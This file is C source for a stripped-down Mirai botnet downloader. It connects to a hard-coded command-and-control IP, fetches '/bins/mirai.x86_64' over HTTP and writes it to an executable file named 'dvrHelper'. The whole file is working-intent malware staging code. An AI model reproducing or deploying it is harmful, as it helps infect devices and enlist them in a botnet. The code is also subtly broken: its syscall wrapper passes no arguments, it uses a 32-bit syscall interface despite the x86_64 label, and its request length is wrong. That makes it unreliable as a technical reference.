/**
 * Simplified DLR for x86_64 - Downloads bot binary via HTTP
 */

#include <sys/types.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

#define HTTP_SERVER inet_addr("172.16.193.190")  // Your CNC IP

#define EXEC_MSG            "MIRAI\n"
#define EXEC_MSG_LEN        6
#define DOWNLOAD_MSG        "FIN\n"
#define DOWNLOAD_MSG_LEN    4

#define STDIN   0
#define STDOUT  1
#define STDERR  2

// Direct syscalls
static long my_syscall(long number, ...) {
    long ret;
    __asm__ volatile (
        "int $0x80"
        : "=a" (ret)
        : "a" (number)
        : "memory"
    );
    return ret;
}

static int my_socket(int domain, int type, int protocol) {
    return my_syscall(102, domain, type, protocol);  // SYS_socketcall for socket
}

static int my_connect(int fd, struct sockaddr_in *addr, int len) {
    struct {
        int fd;
        struct sockaddr_in *addr;
        int len;
    } args = {fd, addr, len};
    return my_syscall(102, 3, &args);  // SYS_socketcall, SYS_CONNECT
}

static int my_write(int fd, void *buf, int len) {
    return my_syscall(4, fd, buf, len);  // SYS_write
}

static int my_read(int fd, void *buf, int len) {
    return my_syscall(3, fd, buf, len);  // SYS_read
}

static int my_open(char *path, int flags, int mode) {
    return my_syscall(5, path, flags, mode);  // SYS_open
}

static int my_close(int fd) {
    return my_syscall(6, fd);  // SYS_close
}

static void my_exit(int code) {
    my_syscall(1, code);  // SYS_exit
}

#define socket my_socket
#define connect my_connect
#define write my_write
#define read my_read
#define open my_open
#define close my_close
#define exit my_exit

void _start(void) {
    char recvbuf[128];
    struct sockaddr_in addr;
    int sfd, ffd, ret;
    unsigned int header_parser = 0;
    
    write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    addr.sin_addr.s_addr = HTTP_SERVER;
    
    ffd = open("dvrHelper", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    
    if (sfd == -1 || ffd == -1)
        exit(1);
    
    if (connect(sfd, &addr, sizeof(struct sockaddr_in)) < 0)
        exit(2);
    
    write(sfd, "GET /bins/mirai.x86_64 HTTP/1.0\r\n\r\n", 38);
    
    while (header_parser != 0x0d0a0d0a) {
        char ch;
        int ret = read(sfd, &ch, 1);
        if (ret != 1) exit(4);
        header_parser = (header_parser << 8) | ch;
    }
    
    while (1) {
        int ret = read(sfd, recvbuf, sizeof(recvbuf));
        if (ret <= 0) break;
        write(ffd, recvbuf, ret);
    }
    
    close(sfd);
    close(ffd);
    write(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
    exit(5);
}